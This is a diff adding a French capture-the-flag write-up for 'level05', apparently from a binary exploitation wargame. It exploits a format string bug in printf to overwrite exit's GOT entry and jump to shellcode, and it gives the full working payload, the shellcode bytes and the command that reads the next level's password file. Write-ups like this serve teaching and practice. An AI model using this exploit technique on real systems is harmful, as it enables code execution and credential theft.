@@ -1,0 +1,12 @@
+## level05
+- L'examen du [code source décompilé](/level05/source.c) confirme nos premiers tests avec le binaire : celui-ci se contente de lire sur l'entrée standard (avec `fgets`) avant de réafficher l'entrée en minuscule (avec `printf`). Mais tout comme dans le [niveau 2](/level02/Ressources/README.md), l'appel à `printf` est mal formaté. Ce qui veut dire qu'il sera possible d'utiliser `%n` pour écrire des données arbitraires à une adresse voulue.
+- Nous allons injecter un *shellcode* dans l'environnement et remplacer l'adresse de `exit` dans la [*Global Offset Table*](https://en.wikipedia.org/wiki/Global_Offset_Table) par l'adresse de ce dernier :
+    - `objdump -TR level05` nous donne l'adresse de `exit()` => `080497e0`. Toutefois, nous ne pourrons réécrire que 4 octets à la fois, il faudra donc réécrire l'adresse en deux fois : d'abord les octets de poid faible (`\xe0\x97\x04\x08`), puis les octets de poids fort (`\xe2\x97\x04\x08`).
+    - `python -c 'print "AAAA" + "%08x|" * 15' | ./level05` nous permet de voir que  l'index de `buff` dans la pile se trouve à la dixième position (`61616161` est la valeur ASCII de `aaaa`). On va commencer à réécrire avec le paramètre `%10$08hn` (et continuer avec `%11$08hn`).
+- Au final :
+    - on exporte notre [*shellcode*](http://shell-storm.org/shellcode/files/shellcode-575.php) : `export SHELLCODE=$(python -c 'print "\x90"*1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')`
+    - On en retrouve l'adresse dans l'environnement depuis `gdb` avec `x/10s *((char **)environ)` => `0xffffd9de`. On va décaler cette adresse de 256 octets (`0xffffdade`) pour prendre en compte la différence d'environnement lors de l'exécution en dehors de `gdb`.
+    - La réécriture de l'adresse se fera en deux temps, en commençant par la fin (*little-endian* oblige) :
+        1. Notre adresse finit par `0xdade`, il faudra donc écrire 56 030 caractères. Mais comme on écrit déjà 8 caractères avec les deux adresses de `exit`, il ne restera plus que 56 022 caractères à écrire.
+        2. Notre adresse commençant par `0xffff`, il faut que l'on écrive en tout 65 535 caractères. Comme on en aura déjà écrit 56 030, il n'en restera plus que 9 505 à écrire.
+- Notre exploit aura la forme : `(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56022x" + "%10$08hn" + "%9505x" + "%11$08hn"' ; cat -) | ./level05`. On obtient le flag avec `cat /home/users/level06/.pass`.
